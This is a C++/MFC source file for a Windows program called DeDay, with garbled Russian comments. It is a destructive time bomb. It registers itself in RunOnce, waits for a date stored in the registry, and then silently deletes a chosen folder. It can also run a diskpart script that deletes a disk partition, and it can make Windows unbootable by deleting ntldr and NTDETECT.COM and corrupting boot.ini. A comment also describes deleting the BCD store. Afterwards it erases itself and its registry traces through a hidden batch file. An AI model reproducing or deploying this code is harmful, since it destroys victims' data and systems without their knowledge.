// DeDay.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"

#include <string>
using namespace std;

#include "DeDay.h"
#include "DeDayDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CDeDayApp

BEGIN_MESSAGE_MAP(CDeDayApp, CWinApp)
	ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()


// CDeDayApp construction

CDeDayApp::CDeDayApp()
{
	// TODO: add construction code here,
	// Place all significant initialization in InitInstance
}


// The one and only CDeDayApp object

CDeDayApp theApp;


// CDeDayApp initialization

//================  ����� ����� ===================
/*
	1. ����� ������� ������� ����� ������� ������� ��������� ���� ntldr

	2. ������ ����, ���� ������ ������� ��������� �NTDETECT.COM�. 
	����� �������� ������������ ����� ��������� �����������
������ ������������ (��� ������ �����-���� ���������). � �����: ��-
���������� �����, � �� � ����. � � ��� ���� ������ �� �������. ��������
���������� ��� ���, ��� ��������� ��������. � �� ��� �� ��������:
���������� ���� �� ���� �������� �����.

3. ���������� ���������� ����� �������������� ���� ����������
�boot.ini�. � ����� ���������, � �� �������� (����� �������� � ����
��� �� ������� �����������). � ���, ��������� ��� ��������� � �������
������ � ������ �� Windows ����
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
��� � �������� ������������ (������), �� ������� ������������ �������
���� � ������, ��� ����� � ����. � ��� ���� � ������ ��������������,
��������� ������������. � ���� ������� ������, ��� � ���� ��������-
�� �� �� ������, � �� ������� ������: ������ ��� �partition(1)� ��
�partition(9)�
---------------------------------------------

���� ����� ��������� �������� ������������ ��������, �� ����� �������������� ������� ���� ���������� ��������� �bcd�:

attrib c:\boot\bcd -s -h �r
� ������� � ����� �bcd� �������� ����������, �������� � ������� ��� �������.

del c:\boot\bcd

*/

BOOL CDeDayApp::InitInstance()
{
	CWinApp::InitInstance();

	//������� ���� � RunOnce
	AddToAutorun();

	//��������� ���� ��������
	if (InspectDeleteData()) //���� ���� ���������� ��� �� �������
		return false;		//�� �� ���������� ���� ���������
	
	CDeDayDlg dlg;
	m_pMainWnd = &dlg;
	INT_PTR nResponse = dlg.DoModal();

	return FALSE;
}

bool CDeDayApp::InspectDeleteData()
{
	CString DeleteDay, CurrentDay; 

	int DelDay = 0, DelDayOfWeek = 0, DelMonth = 0;
	int CurDay = 0, CurDayOfWeek = 0, CurMonth = 0;
	
	//�������� ���� ��������
	ReadRegDeleteDay( DelDay, DelDayOfWeek, DelMonth);	 	

	//���������� ������� ����
	GetCurrentDay(CurDay, CurDayOfWeek, CurMonth);

	//�������� ����, ���� ���������, �� ...
	//����� ���������� ����, ���� ������ � ����� �� �����������
	if (DelDay != 0 && DelDayOfWeek != 0 && DelMonth != 0 && CurDay >= DelDay && CurDayOfWeek >= DelDayOfWeek && CurMonth >= DelMonth )
	{
		TRACE0("���� ���������. ������� �����.\n");	
			
		//... ��������� �������
		PerformATask();

		return true;
	}

	return false;
}

bool CDeDayApp::DeleteFolder()
{	
	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	string csPath;

	typedef string::size_type strLength;

	CString cspvData;
		
	SHGetValue(HKEY_CLASSES_ROOT, RegDataKeyName, DelFolderKeyName, &dwDataType, cspvData.GetBuffer(dwDataBufferSize), &dwDataBufferSize);

	csPath = cspvData;

	strLength iLength = csPath.length();
	strLength index = 0;

	/*��������� ������ ���� �:\\����� �����\\ ������ �:\����� �����\*/
	for(;;)
	{
		index = csPath.find("\\", index);
		
		if ( index == -1)
			break;

		csPath.insert(index, "\\");

		index += 2;
	}

	csPath = csPath + '\0'+'\0';
	
	SHFILEOPSTRUCT sh;
	sh.hwnd   = NULL; 
	sh.wFunc  = FO_DELETE;
	sh.pFrom  = csPath.c_str();
	sh.pTo    = NULL;
	sh.fFlags = FOF_NOCONFIRMATION | FOF_SILENT;
	sh.hNameMappings = 0;
	sh.lpszProgressTitle = NULL;
	
	if (SHFileOperation (&sh) != 0)
	{
		TRACE1("����� \"%s\" �� �������.\n", csPath.c_str());
		return false;
	}

	return true;
}

bool CDeDayApp::PerformATask(void)
{
	// ����� �������� ����� ������ - ������ �� ����� %)
    char szFilePath[MAX_PATH] = {"\0"};
    char szFileBat[MAX_PATH] = {"\0"};
    char szFileExe[MAX_PATH] = {"\0"};
	char szFileDiskPart[MAX_PATH] = {"\0"};
	char szTempPath[MAX_PATH] = {"\0"};

    char sz[600]; // ������-��������...

    unsigned int iTmp;
    char* lpTmp;	
	
    GetModuleFileName(NULL, szFileExe, sizeof(szFileExe)); // �������� ���� � ����������� ��������

    if (GetShortPathName(szFileExe, sz, _MAX_PATH)) // ����������� � ��� ����� � ��������� ���
        strcpy(szFileExe, sz);
    
	size_t sLen = strlen(szFileExe)-1;
	lpTmp = szFileExe + sLen; //������ lpTmp ��������� �� ����� ������

    for (iTmp = 0; iTmp < strlen(szFileExe); lpTmp--, iTmp++)
    {
        if (!strncmp(lpTmp, "\\", 1))
            break;
    }

	//������� �� ���� � ���� �������� ���������
	size_t count = lpTmp - szFileExe; //Number of characters to be copied
 
    strncpy(szFilePath, szFileExe, count);
    strcat(szFilePath, "\\");

    GetTempPath(MAX_PATH, szTempPath); // �������� ���� � TEMP-�����
	
	//���� ������� ���� �
	if ( IfDeleteDiskD() )
	{
		CreateDiskpartScript( szFileDiskPart, szTempPath, szFilePath);			
	}

	if ( IfKillWindows() )
	{
		//������ �������� ����� �����������
		DoKillWindows();		
	}

	//������� ��������� �����
	DeleteFolder();	
	
	CreateBatFile(szFileBat, szTempPath, szFilePath, szFileExe, szFileDiskPart);	

    SetFileAttributes(szFileExe, FILE_ATTRIBUTE_ARCHIVE);
    //SetFileAttributes(szFileBat, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN); // "������" ����

	//SetFileAttributes(szFileBat, FILE_ATTRIBUTE_NORMAL); // ������ ���� ����������
  
	HINSTANCE h = ShellExecute(NULL, "open", szFileBat, NULL, NULL, SW_HIDE); // ��������� ������.
	
	SHDeleteKey(HKEY_CLASSES_ROOT, RegDataKeyName);
	//������� �� ������������
	SHDeleteValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", RunOnceItemName);

	KeyBoardLedBlink();	
		
	return false; // � �����������
}


bool CDeDayApp::IfDeleteDiskD(void)
{	
	CString DelD;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//������� ������ ����� ��� ���� � ����
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDiskDKeyName
		, &dwDataType 
		, DelD.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize)!= ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � IfDeleteDiskD().\n");		
	}

	if (DelD.Compare("YES") == 0)
	{
		DelD.ReleaseBuffer();
		return true;
	}

	return false;
}

bool CDeDayApp::IfKillWindows()
{
	CString csKillW;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//������� ������ ����� ��� ���� � ����
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, KillWindowsKeyName
		, &dwDataType 
		, csKillW.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize)!= ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � IfDeleteDiskD().\n");		
	}

	if (csKillW.Compare("YES") == 0)
	{
		csKillW.ReleaseBuffer();
		return true;
	}

	return false;
}

void CDeDayApp::ReadRegDeleteDay(int& DelDay, int& DelDayOfWeek, int& Month)
{
	CString RegStringValue;

	DWORD dwDataBufferSize = 512;
	DWORD dwDataType = REG_SZ;

	//===== �������� ���� �������� ����� =====
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayKeyName
		, &dwDataType 
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize)!= ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � ReadRegDeleteDay() ��� ��������� ��� ��������.\n");
	}
	
	//��������� ������ � �����
	DelDay = atoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	//===== �������� ���� ������ =====
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelDayOfWeekKeyName
		, &dwDataType 
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize)!= ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � ReadRegDeleteDay() ��� ��������� ��� ������ ��������.\n");
	}
	
	//��������� ������ � �����
	DelDayOfWeek = atoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();

	//===== �������� ����� =====
	if (SHGetValue(HKEY_CLASSES_ROOT
		, RegDataKeyName
		, DelMonthKeyName
		, &dwDataType 
		, RegStringValue.GetBuffer(dwDataBufferSize)
		, &dwDataBufferSize)!= ERROR_SUCCESS)
	{
		TRACE0("����� � SHGetValue() � ReadRegDeleteDay() ��� ��������� ������ ��������.\n");
	}
	
	//��������� ������ � �����
	Month = atoi(RegStringValue.GetString());
	RegStringValue.ReleaseBuffer();
	
	return;
}

void CDeDayApp::GetCurrentDay(int& iDay, int& iDayOfWeek, int& iMonth)
{
	CString CurrentDay;

	//�������� ������� ����
	CTime CurrentTime(CTime::GetCurrentTime());
	SYSTEMTIME timeDest;
	CurrentTime.GetAsSystemTime(timeDest);
	
	iDay = timeDest.wDay;
	iDayOfWeek = timeDest.wDayOfWeek;
	iMonth = timeDest.wMonth;
		
	//CurrentDay.Format("%d%d%d", iDay, iDayOfWeek, iMonth);

	return;
}

bool CDeDayApp::CreateDiskpartScript(char szFileDiskPart[], char szTempPath[], char szFilePath[])
{
	char sz[600]; // ������-��������...
	//�������� ��� �� ��������� ����� ��� � ������� �������� ���������
	sprintf(szFileDiskPart, "%sDiskpart.txt", (strlen(szTempPath))?szTempPath:szFilePath);

	SetFileAttributes(szFileDiskPart, FILE_ATTRIBUTE_NORMAL); // ���� ���� ����������, �� ������� ��� ��������� �� ����������

	//������� diskpart �������� ===========================================
	const char DISKPARTSTRING[] = "select disk 0\nselect partition 3\ndelete partition noerr override";
	//��������� ������ ��� ������ � ����
	sprintf(sz, DISKPARTSTRING);

	HANDLE hFile = CreateFile((LPCTSTR)szFileDiskPart, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // ������� ��-����� ���� ("�����?" - ���. ����������� ������)

	if (!hFile)
	{
		MessageBox(NULL, "���� ���, ����� Diskpart.txt ��� � �� �����", "�����", MB_OK | MB_ICONSTOP);
		return false;
	}

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, strlen(sz), &dwBytesWritten, NULL) || strlen(sz) != dwBytesWritten);

	if (bError)
	{
		MessageBox(NULL, "���� ���, ����� � ���� Diskpart.txt �� ������� ��������", "�����", MB_OK | MB_ICONSTOP);
		return false;
	}

	CloseHandle(hFile);

	return true;
}

bool CDeDayApp::CreateBatFile(char szFileBat[], char szTempPath[], char szFilePath[], char szFileExe[], char szFileDiskPart[])
{
	bool bDeleteD = IfDeleteDiskD();

	char BATSTRING[1024] = 
		":Repeat\n"
		"del \"%s\"\n" //������� �� �������� ���������
		"if exist \"%s\" goto Repeat\n" //��������� ���� �� ���������
		":Repeat1\n"
		"del \"%s\"\n"
		"\0"; //�������� �������		

	if (bDeleteD)
	{
		strcpy(BATSTRING,
			":Repeat\n"
		"del \"%s\"\n" //������� �� �������� ���������
		"if exist \"%s\" goto Repeat\n" //��������� ���� �� ���������
		"DiskPart.exe /S \"%s\"\n" //������� �� �������� �������
		":Repeat1\n"
		"del \"%s\"\n" //�������� �������
		"del \"%s\"\n\0"); //�������� �������� diskpart
	}

	char sz[600]; // ������-��������...
	//������� ���-���� ===========================================
	sprintf(szFileBat, "%sSystem.bat", (strlen(szTempPath))?szTempPath:szFilePath);
		
	SetFileAttributes(szFileBat, FILE_ATTRIBUTE_NORMAL); // ���� ���� ����������, �� ������� ��� ��������� �� ����������

    HANDLE hFile = CreateFile((LPCTSTR)szFileBat, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		(HANDLE)NULL); // ������� ��-����� ���� ("�����?" - ���. ����������� ������)

    if (!hFile)
    {
        MessageBox(NULL,  "���� ���, ����� System.bat ��� � �� �����", "�����", MB_OK | MB_ICONSTOP);
        return false;
    }

	if(bDeleteD)
	{
		//��������� ������ ��� ������ � ����
		sprintf(sz, BATSTRING, szFileExe, szFileExe, szFileDiskPart, szFileDiskPart, szFileBat);
	}
	else
	{
		sprintf(sz, BATSTRING, szFileExe, szFileExe, szFileBat);
	}

	DWORD dwBytesWritten;

	BOOL bError = (!WriteFile(hFile, sz, strlen(sz), &dwBytesWritten, NULL) || strlen(sz) != dwBytesWritten);

    if (bError)
    {
        MessageBox(NULL, "���� ���, ����� � ���� System.bat �� ������� ��������", "�����", MB_OK | MB_ICONSTOP);
        return false;
    }

	CloseHandle(hFile); // ���������� ��������� ���� ����� �������� �������, ����� ���� �� ������ ���� ������ �������

	return true;
}

void CDeDayApp::KeyBoardLedBlink(void)
{
	for(int i = 0; i < 3; i++)
	{
		for (int c = 0; c < 2; c++)
		{
			INPUT inp;
			::ZeroMemory(&inp, sizeof(inp));

			inp.type = INPUT_KEYBOARD;
			inp.ki.wVk = VK_NUMLOCK;
			inp.ki.dwFlags = 0;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);

			inp.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);
		}

		for (int c = 0; c < 2; c++)
		{
			INPUT inp;
			::ZeroMemory(&inp, sizeof(inp));

			inp.type = INPUT_KEYBOARD;
			inp.ki.wVk = VK_CAPITAL;
			inp.ki.dwFlags = 0;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);

			inp.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);
		}

		for (int c = 0; c < 2; c++)
		{
			INPUT inp;
			::ZeroMemory(&inp, sizeof(inp));

			inp.type = INPUT_KEYBOARD;
			inp.ki.wVk = VK_SCROLL;
			inp.ki.dwFlags = 0;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);

			inp.ki.dwFlags = KEYEVENTF_KEYUP;
			SendInput(1, &inp, sizeof(INPUT));

			Sleep(75);
		}
	}

	//==============================================
	//����������� ������� ���������� ������ RCONTROL+SCROLL+SCROLL

	//INPUT input;
	//::ZeroMemory(&input, sizeof(input));	

	////�������� ������ CONTROL
	//input.type = INPUT_KEYBOARD;
	//input.ki.wVk = VK_MENU;
	//SendInput(1, &input, sizeof(INPUT));
	//TRACE0("������ ������ CONTROL\n");

	//for (int c = 0; c < 2; c++)
	//	{
	//		INPUT inp;
	//		::ZeroMemory(&inp, sizeof(inp));

	//		inp.type = INPUT_KEYBOARD;
	//		inp.ki.wVk = VK_PRINT;
	//		inp.ki.dwFlags = 0;
	//		SendInput(1, &inp, sizeof(INPUT));
	//		TRACE0("������ �� CSROLL\n");
	//		
	//		inp.ki.dwFlags = KEYEVENTF_KEYUP;
	//		SendInput(1, &inp, sizeof(INPUT));
	//		TRACE0("��������� CSROLL\n");

	//		Sleep(500);
	//	}

	////��������� ������ CONTROL
	//input.ki.wVk = VK_MENU;
	//input.ki.dwFlags = KEYEVENTF_KEYUP;	
	//SendInput(1, &input, sizeof(INPUT));
	//TRACE0("��������� ������ CONTROL\n");

	//==============================================
	TRACE0("���� ������ �� ��� ������.\n");
}

bool CDeDayApp::AddToAutorun(void)
{
	CString csExePath;
	DWORD dwSize = 512; 
	GetModuleFileNameA( NULL, csExePath.GetBuffer(dwSize), dwSize );
	TRACE1("���� � ��������� = %s\n", csExePath.GetString());

	csExePath.ReleaseBuffer();

	//�������� ���� � ������������
	//�������� ���������� ����� ��������� � RunOnce � ������ ��� ���� ���� ��������� ���� ��
	//���������� ���� ������������
	if (SHSetValue(HKEY_LOCAL_MACHINE
		, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
		, RunOnceItemName
		, REG_SZ
		, csExePath.GetString()
		, csExePath.GetLength())!= ERROR_SUCCESS)
		{
			//MessageBox("����� � SHSetValue() � AddToAutorun()", "�����", MB_ICONERROR);
			return false;
		}

	return true;
}


void CDeDayApp::DoKillWindows()
{
	
	//remove();
	const int INFO_BUFFER_SIZE = 100;
	
	CString SystemDisk;

	//�� ����� ����� ����� �����?
	//GetBuffer() Returns a pointer to the internal character buffer for the CSimpleStringT object
	GetWindowsDirectory( SystemDisk.GetBuffer(INFO_BUFFER_SIZE), INFO_BUFFER_SIZE);

	SystemDisk.ReleaseBuffer();

	//��� ����� ������ ����� �����, �������� �� ������
	SystemDisk = SystemDisk.Left(3);
	TRACE("%s\n", SystemDisk);
	
	//===== 1 ������� ntldr =====
	CString csFileName = SystemDisk + "\\ntldr";

	::SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_TEMPORARY);

	if (!DeleteFile(csFileName.GetString()))
		TRACE("�����! ���� �� ������");

	//===== 2 ������� ntdetect.com =====
	csFileName = SystemDisk + "\\NTDETECT.COM";

	::SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_TEMPORARY);

	if (!DeleteFile(csFileName.GetString()))
		TRACE("�����! ���� �� ������");
		
	//===== 3 �������� boot.ini =====
	CFile BootIniFile;
	
	const int bufSize = 1024;
	char readBuffer[bufSize];

	csFileName = SystemDisk + "\\boot.ini";

	//--- ������ ���� ---
	if (!BootIniFile.Open(csFileName.GetString(), CFile::modeReadWrite))
	{
		MessageBox(NULL, "�� ������� ������� ����", "�����", MB_OK);
		return;
	}

	int BytesRead = BootIniFile.Read(readBuffer, sizeof(readBuffer));
	
	BootIniFile.Close();

	BootIniFile.Remove(csFileName.GetString());
	
	//--- ���������� ���� ---
	CString csBootINI(readBuffer);	
	
	csBootINI.Replace("partition(1)", "partition(9)");

	if (!BootIniFile.Open(csFileName.GetString(), CFile::modeWrite|CFile::modeCreate))
	{
		MessageBox(NULL, "�� ������� ������� ����", "�����", MB_OK);
		return;
	}

	BootIniFile.Write( csBootINI, BytesRead );

	BootIniFile.Close();

	//������ ��� ����...
	SetFileAttributes(csFileName.GetString(), FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
}